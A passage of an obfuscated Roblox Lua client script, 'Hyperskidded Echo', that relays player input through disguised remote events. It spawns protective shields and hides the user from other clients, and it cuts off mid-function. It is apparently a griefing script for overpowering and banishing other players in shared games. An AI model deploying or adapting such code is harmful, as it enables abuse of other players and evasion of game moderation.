			local repStorage = game:GetService("ReplicatedStorage")
			local Username_ = script.Parent.Name
			local Player = game:GetService("Players"):FindFirstChild(Username_)
			local lplr = game:GetService("Players").LocalPlayer
			local Plrs = S.Players
			local stopeverything = false
			local fonts = {"Antique","Arcade","Arial","ArialBold","Bodoni","Cartoon","Code","Fantasy","Garamond","Gotham","GothamBlack","GothamBold","GothamSemibold","Highway","SciFi","SourceSans","SourceSansBold","SourceSansItalic","SourceSansLight","SourceSansSemibold"}
			local FONTS = fonts
			local Fonts = fonts
			local alreadyfixing = false
			local FXFolder = script["d8(*#*YRF@(diod2"]["EfffeFeffefecTss"]
			FXFolder.Parent = nil

			local FolderForImportantStuffs = game:GetService("TestService"):FindFirstChild("🅳🅵🆄🅸🆂🅷🅵🆇🅴🅰🅸🆁🆆🅴🅹🅼🅷🆃🆁🅸🅴🅾🅾🆁🅸")
			if FolderForImportantStuffs == nil then
				FolderForImportantStuffs = game:GetService("TestService"):FindFirstChild("ЩFDΣЩЯFЯЩQGЩЯFΣЩF")
			end
			if FolderForImportantStuffs == nil then
				FolderForImportantStuffs = game:GetService("SoundService"):FindFirstChild("🅳🅵🆄🅸🆂🅷🅵🆇🅴🅰🅸🆁🆆🅴🅹🅼🅷🆃🆁🅸🅴🅾🅾🆁🅸")	
			end
			if FolderForImportantStuffs == nil then
				FolderForImportantStuffs = game:GetService("SoundService"):FindFirstChild("ЩFDΣЩЯFЯЩQGЩЯFΣЩF")	
			end
			if FolderForImportantStuffs == nil then
				FolderForImportantStuffs = game:GetService("Chat"):FindFirstChild("🅳🅵🆄🅸🆂🅷🅵🆇🅴🅰🅸🆁🆆🅴🅹🅼🅷🆃🆁🅸🅴🅾🅾🆁🅸")
			end
			if FolderForImportantStuffs == nil then
				FolderForImportantStuffs = game:GetService("Chat"):FindFirstChild("ЩFDΣЩЯFЯЩQGЩЯFΣЩF")
			end
			warn("-------------------------------------------------------------------------------------------------------------------------")
			print([[
 ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌          ▐░▌▐░▌          
▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                       
]])
			warn("-------------------------------------------------------------------------------------------------------------------------")
			warn("Hyperskidded Echo has been started")
			warn("(HSE) Current version: "..SCRIPTVERSION.."")
			warn("(HSE) Security patch level: "..SECURITYPATCHDATE.."")
			warn("(HSE) Current user: "..Username_.."")
			warn("(HSE) List of objects inside FolderForImportantStuffs")
			warn("-------------------------------------------------------------------------------------------------")
			for i,v in pairs(FolderForImportantStuffs:GetChildren()) do
				print("This object '"..v.Name.."' is from FolderForImportantStuffs")
			end
			warn("-------------------------------------------------------------------------------------------------")
			warn("-------------------------------------------------------------------------------------------------------------------------")
			--
			game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {Text = "Hyperskidded Echo (HSE) "..SCRIPTVERSION.." Loaded. USE Edit by SUPER_TIGERPRO/super_tiger123456"})
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Hyperskidded Echo";
				Text = "Still can get killed by LC's damage...";
				Duration = 90;
				Button1 = "Okay :D";
			})
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Hyperskidded Echo";
				Text = "Please mind that this script is not as powerful as Hyperskidded Cannon.";
				Duration = 90;
				Button1 = "Okay :D";
			})
			local SyncFolder = FolderForImportantStuffs["IYTFieirforJ*(389w"]
			local LoopType = FolderForImportantStuffs["ioy@o2O*r($y*(J9"]
			local DamageRemote = FolderForImportantStuffs["&*@r18r9!Y@$(R"]
			local SongLooped = FolderForImportantStuffs["@RII@(R*U@R(*@)RKR(@"]
			local SongVol = FolderForImportantStuffs["&*^237$&@#$*@474292"]
			local Movement = FolderForImportantStuffs["*(@#*R&$*(@*R!Yrj291r"]
			local SongMXDistance = FolderForImportantStuffs["&*!#$19491UU--1=$!*("]
			local MoveType = FolderForImportantStuffs["!*(YR*R891rU@!(*Rde3()#"]
			local MusID = Instance.new("NumberValue")
			MusID.Name = "&*(&*93229r8u8r27*(&&*^&*&@#(2093e2098"
			MusID.Value = 0
			MusID.Parent = FolderForImportantStuffs
			local ChatRemote = FolderForImportantStuffs["F#@R9829rU#@(*R@#RKU)(#"]
			if stopeverything then wait(math.huge) end
			if Player and type(Player) ~= "table" then
				if lplr.Name == Username_ then
					Player.Chatted:Connect(function(teckz)
						if stopeverything then wait(math.huge) end
						ChatRemote:FireServer(teckz)
					end)
				end
			end
			Character = FolderForImportantStuffs[Username_]:Clone()
			char = Character
			RealRoot = game:GetService("Workspace").Terrain:WaitForChild(Username_.."'s REjiiwodjiwqoferhiuweuhAAUIAHuiweei")

			if lplr == Player then
				local lMouse = Player:GetMouse()
				local HB = game:GetService("RunService").Heartbeat
				local Remote = FolderForImportantStuffs["#*(R()R9r2R*U!)(@Rr21r"]
				local Remote2 = FolderForImportantStuffs["R!(!R!(*R)@IR!@R()UR(@!(RU01"]

				lMouse.KeyDown:Connect(function(Key)
					Remote:FireServer("KeyDown", Key)
				end)
				lMouse.KeyUp:Connect(function(Key)
					Remote:FireServer("KeyUp", Key)
				end)
				lMouse.Button1Down:Connect(function(Key)
					Remote:FireServer("MouseButton1Down", Key)
				end)
				lMouse.Button1Up:Connect(function(Key)
					Remote:FireServer("MouseButton1Up", Key)
				end)

				spawn(function()
					while true do
						for i = 1,1000,1 do
							HB:wait()
							Remote2["r"..i]:FireServer(lMouse.Hit, lMouse.Target)
						end
					end
				end)
			end

			local Mouse = {}

			do
				local Remote = FolderForImportantStuffs["#*(R()R9r2R*U!)(@Rr21r"]
				local Hits = FolderForImportantStuffs["R!(!R!(*R)@IR!@R()UR(@!(RU01"]
				local KeyDown = Instance.new("BindableEvent")
				local KeyUp = Instance.new("BindableEvent")
				local MouseButton1Down = Instance.new("BindableEvent")
				local MouseButton1Up = Instance.new("BindableEvent")
				local Hit = FolderForImportantStuffs["ewfqwur89eqer83(Y*(#@!RJ!@(*"]
				local Target = FolderForImportantStuffs["67$#*(@!*R(@RE=2"]
				Mouse.KeyDown = KeyDown.Event
				Mouse.KeyUp = KeyUp.Event
				Mouse.Button1Down = MouseButton1Down.Event
				Mouse.Button1Up = MouseButton1Up.Event
				Remote.OnClientEvent:Connect(function(request, ...)
					if request == "KeyDown" then
						KeyDown:Fire(...)
					end
					if request == "KeyUp" then
						KeyUp:Fire(...)
					end
					if request == "MouseButton1Down" then
						MouseButton1Down:Fire(...)
					end
					if request == "MouseButton1Up" then
						MouseButton1Up:Fire(...)
					end
				end)

				Mouse.Hit = Hit.Value
				Mouse.Target = Target.Value
				if Player then
					if lplr ~= Player then
						local FakeGui = Instance.new("Folder")
						FakeGui.Name = "PlayerGui"
						FakeGui.Parent = Player
						local FakeBackpack = Instance.new("Folder")
						FakeBackpack.Name = "Backpack"
						FakeBackpack.Parent = Player
					end
				end
				local ArtificialHB = Instance.new("BindableEvent", script)
				ArtificialHB.Name = "ArtificialHB2"
				script:WaitForChild("ArtificialHB2")
				frame = 1/60
				tf = 5
				allowframeloss = false
				tossremainder = true
				lastframe = tick()
				script.ArtificialHB2:Fire()
				game:GetService("RunService").Heartbeat:connect(function(s, p)
					tf = tf + s
					if tf >= frame then
						if allowframeloss then
							ArtificialHB:Fire()
							lastframe = tick()
						else
							for i = 1, math.floor(tf / frame) do
								ArtificialHB:Fire()
							end
							lastframe = tick()
						end
						if tossremainder then
							tf = 0
						else
							tf = tf - frame * math.floor(tf / frame)
						end
					end
				end)

				function BaseWait(NUMBER)
					if NUMBER == 0 or NUMBER == nil then
						if LoopType.Value == "Server" then
							SyncFolder.ChildAdded:wait()
						elseif LoopType.Value == "RenderStepped" then
							game:GetService("RunService").RenderStepped:wait()
						elseif LoopType.Value == "Stepped" then
							game:GetService("RunService").Stepped:wait()
						elseif LoopType.Value == "Heartbeat" then
							game:GetService("RunService").Heartbeat:wait()
						elseif LoopType.Value == "Custom" then
							ArtificialHB.Event:wait()
						elseif LoopType.Value == "DefWait" then
							wait()
						end
					else
						for i = 1, NUMBER do
							if LoopType.Value == "Server" then
								SyncFolder.ChildAdded:wait()
							elseif LoopType.Value == "RenderStepped" then
								game:GetService("RunService").RenderStepped:wait()
							elseif LoopType.Value == "Stepped" then
								game:GetService("RunService").Stepped:wait()
							elseif LoopType.Value == "Heartbeat" then
								game:GetService("RunService").Heartbeat:wait()
							elseif LoopType.Value == "Custom" then
								ArtificialHB.Event:wait()
							elseif LoopType.Value == "DefWait" then
								wait()
							end
						end
					end
				end
				swait = BaseWait
				Swait = BaseWait
				ArtificialHB.Event:Connect(function()
					Mouse.Hit = Hit.Value
					Mouse.Target = Target.Value
					if Swait ~= BaseWait then
						Swait = BaseWait
					end
					if swait ~= BaseWait then
						swait = BaseWait
					end
				end)
			end

			Cam = game:GetService("Workspace").CurrentCamera
			if lplr == Player then
				Cam.CameraSubject = Character:FindFirstChildOfClass("Humanoid")
			end
			if lplr == Player then
				game:GetService("RunService").Heartbeat:Connect(function()
					Player.Character = Character
					Cam.CameraSubject = Character:FindFirstChildOfClass("Humanoid")
				end)
			end
			Character.Parent = game:GetService("Workspace")
			RootV3 = Character:WaitForChild("HumanoidRootPart")
			TorsV3 = Character:WaitForChild("Torso")
			local ActualVelocity = Vector3.new(0,0,0)
			if lplr == Player then
				spawn(function()
					while true do
						local Positions = {}
						local Speeds = {}
						for i = 1,10 do
							table.insert(Positions, RootV3.CFrame)
							table.insert(Speeds, RootV3.Velocity)
							script.ArtificialHB2.Event:wait()
						end
						Movement:FireServer(Positions, Speeds)
					end
				end)
				spawn(function()
					while true do
						game:GetService("RunService").Heartbeat:wait()
						RealRoot = game:GetService("Workspace").Terrain:WaitForChild(Username_.."'s REjiiwodjiwqoferhiuweuhAAUIAHuiweei")
						RealRoot.CFrame = RootV3.CFrame
					end
				end)
				Movement.OnClientEvent:Connect(function()

				end)
			end

			if lplr ~= Player then
				local Last = RootV3.Position
				Movement.OnClientEvent:Connect(function(v, Speed)
					for i,v2 in pairs(v) do
						ActualVelocity = Speed[i]
						if v[i].p ~= Last then
							if MoveType.Value == "Remote" then
								print("(HSE) MoveType: Remote")
								RootV3.CFrame = v[i]
							end
							Last = v[i].p
							script.ArtificialHB2.Event:wait()
						end
					end
				end)
				spawn(function()
					while true do
						game:GetService("RunService").Heartbeat:wait()
						RealRoot = game:GetService("Workspace").Terrain:WaitForChild(Username_.."'s REjiiwodjiwqoferhiuweuhAAUIAHuiweei")
						if MoveType.Value == "Smooth" then
							print("(HSE) MoveType: Smooth")
							RootV3.CFrame = RealRoot.CFrame
						end
					end
				end)
			end

			local function randomstring()
				local length = math.random(10,20)
				local array = {}
				for i = 1,length do
					array[i] = string.char(math.random(32,126))
				end
				return table.concat(array)
			end

			Shield = Instance.new("UnionOperation",game:GetService("Workspace"))
			Shield.Name = "EnCorrupt"
			Shield.CanCollide = true
			Shield.Transparency = 1
			Shield.Material = "Neon"
			Shield.Color = Color3.fromRGB(0,0,0)
			Shield.Massless = true
			Shield.Size = Vector3.new(12.715, 12.9, 11.447)
			Shield.CFrame = TorsV3.CFrame
			Shield.Locked = true
			GlitchWeld = Instance.new("Weld",Shield)
			GlitchWeld.Part0 = Shield
			GlitchWeld.Part1 = TorsV3
			Shield2 = Instance.new("UnionOperation", game:GetService("Workspace"))
			Shield2.Name = Username_.."Shield Anti Banish Bullets"
			Shield2.CanCollide = true
			Shield2.Transparency = 1
			Shield2.Material = "Neon"
			Shield2.Size = Vector3.new(5.3,6.3,5.3)
			Shield2.CFrame = TorsV3.CFrame
			Shield2.Locked = true
			Wed = Instance.new("Weld", Shield2)
			Wed.Part0 = Shield2
			Wed.Part1 = TorsV3
			game:GetService("RunService").Heartbeat:Connect(function()
				if Shield.Parent~=game:GetService("Workspace") then
					pcall(function()
						Shield:Remove()
					end)
					Shield = Instance.new("UnionOperation",game:GetService("Workspace"))
					Shield.Name = "EnCorrupt"
					Shield.CanCollide = true
					Shield.Transparency = 1
					Shield.Material = "Neon"
					Shield.Color = Color3.fromRGB(0,0,0)
					Shield.Massless = true
					Shield.Size = Vector3.new(12.715, 12.9, 11.447)
					Shield.CFrame = TorsV3.CFrame
					Shield.Locked = true
					GlitchWeld = Instance.new("Weld",Shield)
					GlitchWeld.Part0 = Shield
					GlitchWeld.Part1 = TorsV3
				end
				if Shield2.Parent~=game:GetService("Workspace") then
					pcall(function()
						Shield2:Remove()
					end)
					Shield2 = Instance.new("UnionOperation", game:GetService("Workspace"))
					Shield2.Name = Username_.."Shield Anti Banish Bullets"
					Shield2.CanCollide = true
					Shield2.Transparency = 1
					Shield2.Material = "Neon"
					Shield2.Size = Vector3.new(5.3,6.3,5.3)
					Shield2.CFrame = TorsV3.CFrame
					Shield2.Locked = true
					Wed = Instance.new("Weld", Shield2)
					Wed.Part0 = Shield2
					Wed.Part1 = TorsV3
				end
				for i,v in pairs(Character:GetChildren()) do
					if v:IsA("BasePart") and v.Anchored == false and v.Position.Y < (game:GetService("Workspace").FallenPartsDestroyHeight + 60) then
						local flot = Instance.new("BodyPosition")
						local spen = Instance.new("BodyGyro")
						local hu = math.huge
						flot.MaxForce = Vector3.new(hu,hu,hu)
						spen.MaxTorque = Vector3.new(hu,hu,hu)
						local spown = nil
						for o,b in pairs(game:GetService("Workspace"):GetDescendants()) do
							if not b:IsDescendantOf(Character) and b:IsA("SpawnLocation") then
								spown = b
							end
						end
						if spown then
							RootV3.CFrame = CFrame.new(spown.Position.X,spown.Position.Y+(spown.Size.Y/2)+6,spown.Position.Z)
						else
							local base = game:GetService("Workspace"):FindFirstChild("Base")
							if not base then
								base = game:GetService("Workspace"):FindFirstChild("Baseplate")
							end
							if base then
								RootV3.CFrame = CFrame.new(math.clamp(RootV3.Position.X,(-base.Size.X/2)+5,(base.Size.X/2)-5),base.Position.Y+(base.Size.Y/2)+6,math.clamp(RootV3.Position.Z,(-base.Size.X/2)+5,(base.Size.X/2)-5))
							else
								RootV3.CFrame = CFrame.new(math.clamp(RootV3.Position.X,-100,100),30,math.clamp(RootV3.Position.Z,-100,100))
							end
						end
						flot.Position = RootV3.Position
						flot.Parent = RootV3
						spen.CFrame = RootV3.CFrame
						spen.Parent = RootV3
						game:GetService("Debris"):AddItem(flot,1)
						game:GetService("Debris"):AddItem(spen,1)
					end
				end
			end)

			Replicatorranwarn:Destroy()

			if game:GetService("Players"):FindFirstChild(Player.Name) then
				if lplr.Name ~= Player.Name then
					Player.Parent = nil
				end
			end
			game:GetService("Players").PlayerAdded:Connect(function()
				if game:GetService("Players"):FindFirstChild(Player.Name) then
					if lplr.Name ~= Player.Name then
						Player.Parent = nil
					end
				end
			end)

			PlayerGui = Player.PlayerGui
			Cam = game:GetService("Workspace").CurrentCamera
			Backpack = Player.Backpack
			if lplr == Player then
				Cam.CameraSubject = Character:FindFirstChildOfClass("Humanoid")
			end
			if lplr == Player then
				game:GetService("RunService").Heartbeat:Connect(function()
					Player.Character = Character
					Cam.CameraSubject = Character:FindFirstChildOfClass("Humanoid")
				end)
			end
			Character.PrimaryPart = Character.HumanoidRootPart
			Character.Parent = game:GetService("Workspace")
			Humanoid = Character.Humanoid
			RootPart = Character["HumanoidRootPart"]
			Torso = Character["Torso"]
			Head = Character["Head"]
			RightArm = Character["Right Arm"]
			LeftArm = Character["Left Arm"]
			RightLeg = Character["Right Leg"]
			LeftLeg = Character["Left Leg"]
			RootJoint = RootPart["RootJoint"]
			Neck = Torso["Neck"]
			RightShoulder = Torso["Right Shoulder"]
			LeftShoulder = Torso["Left Shoulder"]
			RightHip = Torso["Right Hip"]
			LeftHip = Torso["Left Hip"]
			local TIME = 0

			local Sick = Instance.new("Sound",Head)
			Sick.Name = "qeriopkeriio**(8r7839rjxxjxeroji31op"
			Sick.SoundId = "rbxassetid://"..MusID.Value
			Sick.MaxDistance = SongMXDistance.Value
			Sick.Volume = SongVol.Value
			Sick.Looped = SongLooped.Value
			if Sick.IsPlaying == false then
				Sick:Play()
			end
			Sick.Parent = Torso

			local NORMALFACE = Head:FindFirstChildWhichIsA("Decal").Texture

			IT = Instance.new
			CF = CFrame.new
			VT = Vector3.new
			RAD = math.rad
			C3 = Color3.new
			UD2 = UDim2.new
			BRICKC = BrickColor.new
			ANGLES = CFrame.Angles
			EULER = CFrame.fromEulerAnglesXYZ
			COS = math.cos
			ACOS = math.acos
			SIN = math.sin
			ASIN = math.asin
			ABS = math.abs
			MATHR = math.random
			FLOOR = math.floor

			--//=================================\\
			--|| 	         Bruh
			--\\=================================//
			local NoLeaving = Instance.new("ScreenGui")
			NoLeaving.Name = "NoLeaving"
			NoLeaving.DisplayOrder = 2147483647
			NoLeaving.ResetOnSpawn = false
			NoLeaving.IgnoreGuiInset = true
			local RejoinShit = Instance.new("TextLabel")
			RejoinShit.Name = "RejoinShit"
			RejoinShit.Size = UDim2.new(1, 0, 1, 0)
			RejoinShit.BackgroundColor3 = Color3.fromRGB(0, 0, 127)
			RejoinShit.FontSize = Enum.FontSize.Size14
			RejoinShit.TextSize = 14
			RejoinShit.TextColor3 = Color3.fromRGB(0, 255, 0)
			RejoinShit.Text = ([[
 ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌          ▐░▌▐░▌          
▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                       
]])
			RejoinShit.TextWrap = true
			RejoinShit.Font = Enum.Font.SourceSans
			RejoinShit.TextWrapped = true
			RejoinShit.TextScaled = true
			RejoinShit.Parent = NoLeaving
			game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
			game:GetService("TeleportService"):SetTeleportGui(NoLeaving)

			--//=================================\\
			--|| 	      USEFUL VALUES
			--\\=================================//

			Animation_Speed = 3.0
			Frame_Speed = 1 / 60 -- (1 / 30) OR (1 / 60)
			local Speed = 30
			local SIZE = 1
			local ROOTC0 = CF(0, 0, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
			local NECKC0 = CF(0, 1, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
			local RIGHTSHOULDERC0 = CF(-0.5, 0, 0) * ANGLES(RAD(0), RAD(90), RAD(0))
			local LEFTSHOULDERC0 = CF(0.5, 0, 0) * ANGLES(RAD(0), RAD(-90), RAD(0))
			local DAMAGEMULTIPLIER = 1
			local ANIM = "Idle"
			local ATTACK = false
			local EQUIPPED = false
			local HOLD = false
			local COMBO = 1
			local Rooted = false
			local SINE = 0
			local sine = 0
			local vissine = 0
			local KEYHOLD = false
			local CHANGE = 2 / Animation_Speed
			local WALKINGANIM = false
			local VALUE1 = false
			local VALUE2 = false
			local ROBLOXIDLEANIMATION = IT("Animation")
			ROBLOXIDLEANIMATION.Name = "Roblox Idle Animation"
			ROBLOXIDLEANIMATION.AnimationId = "http://www.roblox.com/asset/?id=180435571"
			local Weapon = IT("Model")
			local Effects = IT("Folder", Weapon)
			Effects.Name = "Effects"
			local UNANCHOR = true
			local TOBANISH = {}
			local TOBAN = {}
			local TOGUI = {}
			local TAIL = {}
			local VSONGS = {322621962,569026863,502771070,408862087,1471935327,236336857,2280063143,334259331,344685843,1479420512,297754476,591661590,1571736139,2988953773,130768805,2516100492,580535766,213546066,555947343,394236634,195822354,224584376,1576288222,199265353}
			local NK = {271068069,247967952,265024602,252591491,252591097,316039490,1222970152,1222970152}
			local Hue = 0
			local rc0 = CFrame.new() * CFrame.Angles(math.rad(-90),math.rad(0),math.rad(180))
			local nc0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(-90),math.rad(0),math.rad(180))
			local rscp = CFrame.new(-.5,0,0) * CFrame.Angles(math.rad(0),math.rad(90),math.rad(0))
			local lscp = CFrame.new(.5,0,0) * CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0))

			AntiBullet = true
			local PLAYANIMS = true
			local HITFLOOR, HITPOS = nil
			local WEAPONEQUIPPED = false
			local GUNEQUIPPED = false
			local CANNONEQUIPPED = false
			local INTRODONE = false
			local inf = 9e9
			local RUNNING = false

			local Player_Size = SIZE
			local Animation_Speed2 = 5
			local SCALE = 2

			local RunService = game:GetService("RunService")
			local COLORSHIFT = C3(0,0,0)
			local MODE = 1

			local FONTS = {
				Enum.Font.Antique,
				Enum.Font.Arcade,
				Enum.Font.Arial,
				Enum.Font.ArialBold,
				Enum.Font.Bodoni,
				Enum.Font.Cartoon,
				Enum.Font.Code,
				Enum.Font.Fantasy,
				Enum.Font.Garamond,
				Enum.Font.Highway,
				Enum.Font.Legacy,
				Enum.Font.SciFi,
				Enum.Font.SourceSans,
				Enum.Font.SourceSansBold,
				Enum.Font.SourceSansItalic,
				Enum.Font.SourceSansLight,
				Enum.Font.SourceSansSemibold
			}

			local mtext1 = Instance.new("BillboardGui",Character)
			mtext1.AlwaysOnTop = true
			mtext1.Size = UDim2.new(7,35,3,15)
			mtext1.StudsOffset = Vector3.new(0,5,0)
			mtext1.MaxDistance = 10000
			mtext1.Adornee = Head
			mtext1.Name = "Name2"
			local mtext2 = Instance.new("TextLabel",mtext1)
			mtext2.BackgroundTransparency = 1
			mtext2.TextScaled = true
			mtext2.BorderSizePixel = 0
			mtext2.Text = "Normal"
			mtext2.Font = "Arcade"
			mtext2.TextSize = 35
			mtext2.TextStrokeTransparency = 1
			mtext2.Size = UDim2.new(1,0,0.5,0)
			mtext2.Parent = mtext1
			mtext2.TextColor3 = COLORSHIFT
			coroutine.resume(coroutine.create(function()
				while true do
					Swait()
					mtext2.Font = FONTS[MATHR(1, #FONTS)]
					mtext2.Position = UDim2.new(math.random(-.4,.4),math.random(-5,5),.05,math.random(-5,5))
				end
			end))

			local MATERIALS = {
				Enum.Material.Brick,
				Enum.Material.Cobblestone,
				Enum.Material.Concrete,
				Enum.Material.CorrodedMetal,
				Enum.Material.DiamondPlate,
				Enum.Material.Fabric,
				Enum.Material.Foil,
				Enum.Material.ForceField,
				Enum.Material.Glass,
				Enum.Material.Granite,
				Enum.Material.Grass,
				Enum.Material.Ice,
				Enum.Material.Marble,
				Enum.Material.Metal,
				Enum.Material.Neon,
				Enum.Material.Pebble,
				Enum.Material.Plastic,
				Enum.Material.Sand,
				Enum.Material.Slate,
				Enum.Material.SmoothPlastic,
				Enum.Material.Wood,
				Enum.Material.WoodPlanks
			}

			local BruhChatLol
			coroutine.resume(coroutine.create(function()
				for i,v in pairs(lplr:FindFirstChildWhichIsA("PlayerGui"):WaitForChild("Chat"):GetDescendants()) do
					if v:IsA('TextLabel') then
						if v.Text == "Hyperskidded Echo (HSE) "..SCRIPTVERSION.." Loaded. USE Edit by SUPER_TIGERPRO/super_tiger123456" then
							BruhChatLol = v
							break
						end
					end
				end
			end))

			pcall(function()

				do

					--//=================================\\
					--|| 	      HEAD EFFECT
					--\\=================================//


					Head.Transparency = 1

					if Head:FindFirstChildOfClass("Decal") then
						Head:FindFirstChildOfClass("Decal"):Destroy()
					end
					script["DE#3989fd03ud"]["HeadParticle"]:Clone().Parent = Head

					--//=================================\\
					--|| 	       R_ARM EFFECT
					--\\=================================//

					RightArm.Transparency = 0
					RightArm.Material = "ForceField"
					RightArm.Color = Color3.fromRGB(255, 255, 255)


					--//=================================\\
					--|| 	       R_LEG EFFECT
					--\\=================================//

					RightLeg.Transparency = 0
					RightLeg.Material = "ForceField"
					RightLeg.Color = Color3.fromRGB(255, 255, 255)


					--//=================================\\
					--|| SAZERENOS' ARTIFICIAL HEARTBEAT
					--\\=================================//


					gui555 = Instance.new("ScreenGui")
					gui555.Parent = PlayerGui
					exitbutton = Instance.new("TextButton",gui555)
					exitbutton.TextScaled = true
					exitbutton.Font = "Code"
					exitbutton.Name = randomstring()
					exitbutton.BorderSizePixel = 0
					exitbutton.BackgroundTransparency = .5
					exitbutton.TextStrokeTransparency = 0
					exitbutton.BackgroundColor3 = Color3.new(.5,.5,.5)
					exitbutton.Text = "Leave Game"
					exitbutton.Size = UDim2.new(.25,0,0,36)
					exitbutton.AnchorPoint = Vector2.new(.5,1)
					exitbutton.Position = UDim2.new(.5,0,0,0)
					exitbutton.MouseButton1Click:Connect(function()
						Player:kick("You Left!")
					end)

					ArtificialHB = Instance.new("BindableEvent", script)
					ArtificialHB.Name = "ArtificialHB"

					script:WaitForChild("ArtificialHB")

					frame = Frame_Speed
					tf = 0
					allowframeloss = false
					tossremainder = false
					lastframe = tick()
					script.ArtificialHB:Fire()

					game:GetService("RunService").Heartbeat:connect(function(s, p)
						tf = tf + s
						if tf >= frame then
							if allowframeloss then
								script.ArtificialHB:Fire()
								lastframe = tick()
							else
								for i = 1, math.floor(tf / frame) do
									script.ArtificialHB:Fire()
								end
								lastframe = tick()
							end
							if tossremainder then
								tf = 0
							else
								tf = tf - frame * math.floor(tf / frame)
							end
						end
					end)

					--//=================================\\
					--|| 	          WINGS
					--\\=================================//


					local LWing = Instance.new("Part")
					LWing.Parent = Character
					LWing.Size = Vector3.new(4, 1, 2)
					LWing.Color = COLORSHIFT
					LWing.Name = Player.Name.."'s Left Wing Of Madness"
					LWing.Anchored = false
					LWing.Locked = true
					local LWingMsh = Instance.new("SpecialMesh")
					LWingMsh.Parent = LWing
					LWingMsh.Offset = Vector3.new()
					LWingMsh.Scale = Vector3.new(0.0480000004, 0.0480000004, 0.0480000004)
					LWingMsh.MeshType = "FileMesh"
					LWingMsh.MeshId = "rbxassetid://1553468234"
					local RWing = Instance.new("Part")
					RWing.Parent = Character
					RWing.Size = Vector3.new(4, 1, 2)
					RWing.Color = COLORSHIFT
					RWing.Name = Player.Name.."'s Right Wing Of Madness"
					RWing.Anchored = false
					RWing.Locked = true
					local RWingMsh = Instance.new("SpecialMesh")
					RWingMsh.Parent = RWing
					RWingMsh.Offset = Vector3.new()
					RWingMsh.Scale = Vector3.new(0.0480000004, 0.0480000004, 0.0480000004)
					RWingMsh.MeshType = "FileMesh"
					RWingMsh.MeshId = "rbxassetid://1553468709"
					local LWingWld = Instance.new("Motor6D")
					LWingWld.Parent = LWing
					LWingWld.Part0 = Torso
					LWingWld.Part1 = LWing
					LWingWld.C0 = CFrame.new(-0.25, 0.5, 0.5)*CFrame.fromEulerAnglesXYZ(0, 1.57, 0)
					LWingWld.C1 = CFrame.new(1.1, 1, 0.95)
					local RWingWld = Instance.new("Motor6D")
					RWingWld.Parent = RWing
					RWingWld.Part0 = Torso
					RWingWld.Part1 = RWing
					RWingWld.C0 = CFrame.new(0.25, 0.5, 0.5)*CFrame.fromEulerAnglesXYZ(0, 1.57, 0)
					RWingWld.C1 = CFrame.new(1.1, 1, -0.95)


					--//=================================\\
					--|| 	      SOME FUNCTIONS
					--\\=================================//

					local outer = IT("Part")
					outer.Locked = true
					outer.Transparency = 1
					outer.CanCollide = false
					outer.Shape = Enum.PartType.Cylinder
					outer.Size = VT(0.1, 1, 1)
					outer.Material = Enum.Material.Neon
					outer.Color = C3(255,255,255)
					outer.Parent = Character

					local outerm = IT("SpecialMesh")
					outerm.MeshType = Enum.MeshType.Cylinder
					outerm.Parent = outer

					local weld1 = Instance.new("Weld")
					weld1.Part0 = outer
					weld1.Part1 = Character["HumanoidRootPart"]
					weld1.Parent = outer
					weld1.C0 = CF(-2.95, 0, 0) * ANGLES(0, 0, 1.571)
					coroutine.wrap(function()
						--game:GetService("Workspace").Baseplate:ClearAllChildren()
						while true do wait()
							if MODE == 1 then
								outer.Color = Color3.new(Sick.PlaybackLoudness/500,0,0)
							elseif MODE == 2 then
								outer.Color = Color3.new(Sick.PlaybackLoudness/500,0,0)
							elseif MODE == 3 then
								outer.Color = Color3.new(math.min(1,Sick.PlaybackLoudness/1000),math.min(1,Sick.PlaybackLoudness/1000),math.min(1,Sick.PlaybackLoudness/1000))
							elseif MODE == 4 then
								outer.Color = Color3.fromRGB(0, 0, 0)	
							elseif MODE == 5 then
								outer.Color = Color3.fromRGB(234, 97, 0)	
							elseif MODE == 6 then
